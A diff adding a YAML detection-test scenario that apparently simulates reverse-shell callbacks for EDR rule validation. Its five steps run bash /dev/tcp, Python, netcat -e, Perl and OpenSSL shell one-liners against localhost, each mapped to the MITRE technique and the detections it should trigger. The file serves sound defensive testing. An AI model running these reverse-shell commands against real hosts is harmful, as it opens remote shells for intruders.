@@ -1,0 +1,136 @@
+scenario_id: SIM-EDR-002
+name: "Reverse Shell — Multi-Method Callback"
+version: "1.0"
+status: active
+
+plane: EDR
+detection_types:
+  - BIOC
+  - Analytics
+
+uc_ref: UCS-EDR-02
+tc_ref: TC-EDR-02
+uc_name: "Command and Control Detection"
+tc_name: "Reverse Shell Execution"
+
+mitre_tactic: "TA0011"
+mitre_tactic_name: "Command and Control"
+mitre_technique: "T1059.004"
+mitre_technique_name: "Command and Scripting Interpreter: Unix Shell"
+additional_techniques:
+  - technique: "T1071.001"
+    name: "Application Layer Protocol: Web Protocols"
+  - technique: "T1059.006"
+    name: "Command and Scripting Interpreter: Python"
+
+threat_report: "Unit42 - Mirai Variant Targets Linux and IoT Devices"
+threat_report_url: "https://unit42.paloaltonetworks.com/mirai-variant-v3g4/"
+
+execution_identity:
+  default: www-data
+  options:
+    - www-data
+    - node
+    - nobody
+    - root
+
+push_supported: true
+pull_supported: true
+
+external_tools: []
+
+steps:
+  - id: step-01
+    name: "Bash reverse shell attempt (simulated — connects to localhost)"
+    command: |
+      echo '[*] Simulating bash reverse shell — connecting to localhost:4444 (safe, no external C2)';
+      timeout 5 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' 2>/dev/null;
+      echo '[*] Bash reverse shell simulation complete (connection refused expected)'
+    identity: www-data
+    mitre_technique: "T1059.004"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "Bash reverse shell pattern — /dev/tcp redirection detected by XDR Agent behavioral rule"
+      - plane: EDR
+        type: Analytics
+        description: "Interactive bash spawned from service account with network redirect — C2 callback pattern"
+
+  - id: step-02
+    name: "Python reverse shell attempt (simulated — localhost target)"
+    command: |
+      echo '[*] Simulating Python reverse shell to localhost:4445';
+      timeout 5 python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(3);s.connect(('127.0.0.1',4445));exit()" 2>/dev/null;
+      echo '[*] Python reverse shell simulation complete'
+    identity: www-data
+    mitre_technique: "T1059.006"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "Python reverse shell pattern — socket+subprocess import with connect call from service account"
+      - plane: EDR
+        type: Analytics
+        description: "Python process spawned by www-data with socket operations — scripting interpreter abuse"
+
+  - id: step-03
+    name: "Netcat reverse shell attempt (simulated)"
+    command: |
+      echo '[*] Simulating netcat reverse shell to localhost:4446';
+      timeout 5 nc -e /bin/sh 127.0.0.1 4446 2>/dev/null || \
+      timeout 5 ncat -e /bin/sh 127.0.0.1 4446 2>/dev/null || \
+      echo '[*] nc/ncat not available or connection refused (expected)';
+      echo '[*] Netcat reverse shell simulation complete'
+    identity: www-data
+    mitre_technique: "T1059.004"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "Netcat with -e flag — classic reverse shell pattern detected by endpoint BIOC rule"
+      - plane: EDR
+        type: Analytics
+        description: "Network utility (nc/ncat) invoked with shell execution flag from web service context"
+
+  - id: step-04
+    name: "Perl one-liner reverse shell attempt"
+    command: |
+      echo '[*] Simulating Perl reverse shell to localhost:4447';
+      timeout 5 perl -e 'use Socket;$i="127.0.0.1";$p=4447;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));exit();' 2>/dev/null;
+      echo '[*] Perl reverse shell simulation complete'
+    identity: www-data
+    mitre_technique: "T1059.004"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "Perl socket-based reverse shell pattern — one-liner execution from service account"
+
+  - id: step-05
+    name: "Openssl encrypted reverse shell attempt"
+    command: |
+      echo '[*] Simulating OpenSSL encrypted reverse shell to localhost:4448';
+      timeout 5 openssl s_client -quiet -connect 127.0.0.1:4448 2>/dev/null;
+      echo '[*] OpenSSL reverse shell simulation complete — tests encrypted C2 detection'
+    identity: www-data
+    mitre_technique: "T1573.002"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "OpenSSL s_client invoked from non-interactive service account — encrypted C2 channel attempt"
+      - plane: EDR
+        type: Analytics
+        description: "Sequence of multiple reverse shell methods from same process lineage — automated C2 testing behavior"
+
+cleanup:
+  commands:
+    - "echo '[CortexSim] SIM-EDR-002 cleanup complete — no artifacts to remove (all simulated to localhost)'"
+
+author: "Henry Reed"
+created: "2026-04-14"
+last_updated: "2026-04-14"
+tags:
+  - reverse-shell
+  - command-and-control
+  - c2-callback
+  - endpoint-security
+  - bash
+  - python
+  - netcat
